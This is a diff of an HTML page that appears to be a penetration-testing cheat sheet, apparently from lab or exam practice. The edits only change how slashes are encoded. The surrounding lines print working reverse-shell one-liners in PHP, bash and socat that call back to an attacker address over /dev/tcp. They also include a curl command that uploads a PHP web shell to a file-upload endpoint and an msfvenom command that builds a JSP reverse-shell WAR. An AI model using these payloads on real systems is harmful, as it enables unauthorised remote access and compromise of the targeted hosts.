@@ -219,7 +219,7 @@
 <p>PHP reverse shell with bash -c</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/\&quot;192.168.119.142\&quot;/443 0&gt;&amp;1&#x27;&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>PHP reverse shell with bash (won’t work on /bin/sh -&gt; /bin/dash)</p>
+<p>PHP reverse shell with bash (won’t work on &#x2F;bin&#x2F;sh -&gt; &#x2F;bin&#x2F;dash)</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.119.142/8908 0&gt;&amp;1&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>PHP reverse shell with bash -c with double quote escaped</p>
@@ -228,7 +228,7 @@
 <p>socat TTY upgrade</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:8908</span><br><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.119.142:8908</span><br></pre></td></tr></table></figure>
 
-<p>curl multipart/form-data file upload example</p>
+<p>curl multipart&#x2F;form-data file upload example</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F files=@ciph3r.php http://10.11.1.123/books/apps/jquery-file-upload/server/php/index.php</span><br></pre></td></tr></table></figure>
 
 <p>Powershell reverse shell</p>
@@ -244,7 +244,7 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.142 LPORT=8907 -f war &gt; cipher.war</span><br></pre></td></tr></table></figure>
 
 <p>Windows show hidden files</p>
-<p><a target="_blank" rel="noopener" href="https://www.diskpart.com/articles/show-hidden-files-command-line-8523.html">How-to｜Show Hidden Files Using Command Lines in Windows 10/8/7</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.diskpart.com/articles/show-hidden-files-command-line-8523.html">How-to｜Show Hidden Files Using Command Lines in Windows 10&#x2F;8&#x2F;7</a></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> /a:<span class="built_in">h</span> /b /s</span><br></pre></td></tr></table></figure>
 
 <p>MSSQL get other table from other databse</p>
